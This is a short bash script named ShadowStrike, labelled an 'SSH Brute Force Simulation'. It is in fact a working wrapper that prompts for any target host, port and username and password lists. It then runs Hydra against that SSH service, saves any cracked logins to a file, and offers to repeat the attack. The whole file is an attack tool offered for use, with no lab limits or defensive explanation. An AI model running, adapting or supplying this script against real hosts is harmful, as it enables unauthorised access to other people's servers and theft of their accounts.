```bash
#!/bin/bash

# ShadowStrike
# Author: Artemis O. Solomon
# Description: # Interactive Bash Script for SSH Brute Force Simulation
# Version: 1.0

# Function to display the banner
display_banner() 
{
# Banner
echo "_______________________               _____        ";
echo "___    |__  __ \__  __/___________ ______(_)_______";
echo "__  /| |_  /_/ /_  /  _  _ \_  __ \`__ \_  /__  ___/";
echo "_  ___ |  _, _/_  /   /  __/  / / / / /  / _(__  ) ";
echo "/_/  |_/_/ |_| /_/    \___//_/ /_/ /_//_/  /____/  ";
echo "                                                   ";

}

# Function to display an error message, log it, and exit
error_exit() {
  echo "Error: $1"
  echo "$(date +'%Y-%m-%d %H:%M:%S') - Error: $1" >> error.log
  exit 1
}

# Function to check if a command is available
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Function to perform the interactive configuration
configure_attack() {
  echo "Configuring the attack parameters:"

  # Get target host
  read -p "Enter the target host: " TARGET_HOST

  # Get target port
  read -p "Enter the target port (default is 22): " TARGET_PORT
  TARGET_PORT=${TARGET_PORT:-22}

  # Get path to username list
  read -p "Enter the path to the username list file: " USERNAME_LIST

  # Get path to password list
  read -p "Enter the path to the password list file: " PASSWORD_LIST

  # Get path to the output file for successful logins
  read -p "Enter the path to the output file for successful logins: " OUTPUT_FILE

  # Save configuration to a file
  echo "TARGET_HOST=$TARGET_HOST" > config.conf
  echo "TARGET_PORT=$TARGET_PORT" >> config.conf
  echo "USERNAME_LIST=$USERNAME_LIST" >> config.conf
  echo "PASSWORD_LIST=$PASSWORD_LIST" >> config.conf
  echo "OUTPUT_FILE=$OUTPUT_FILE" >> config.conf

  echo "Configuration saved to config.conf"
}

# Function to check resources before executing the attack
check_resources() {
  # Check for the presence of required files
  [ -f "config.conf" ] || error_exit "Configuration file (config.conf) not found. Run configure_attack first."
  source config.conf

  [ -f "$USERNAME_LIST" ] || error_exit "Username list not found!"
  [ -f "$PASSWORD_LIST" ] || error_exit "Password list not found!"

  # Check for the availability of Hydra
  command_exists "hydra" || error_exit "Hydra tool not found. Please install it before running ShadowStrike."
}

# Function to perform the brute force attack
perform_attack() {
  echo "Executing brute force attack..."
  hydra -L "$USERNAME_LIST" -P "$PASSWORD_LIST" ssh://"$TARGET_HOST":"$TARGET_PORT" >> "$OUTPUT_FILE" 2>/dev/null
  echo "Attack completed. Results saved to $OUTPUT_FILE"
}

# Main execution

while true; do
  # Display the banner
  display_banner

  # Check and configure resources
  configure_attack

  # Check if required resources are available
  check_resources

  # Perform the brute force attack
  perform_attack

  # Ask the user whether to repeat the attack or exit
  read -p "Do you want to repeat the attack? (y/n): " choice
  case "$choice" in
    y|Y ) echo "Restarting ShadowStrike..." ;;
    n|N ) echo "Exiting ShadowStrike. Goodbye!"; exit 0;;
    * ) echo "Invalid choice. Exiting."; exit 1;;
  esac
done
```
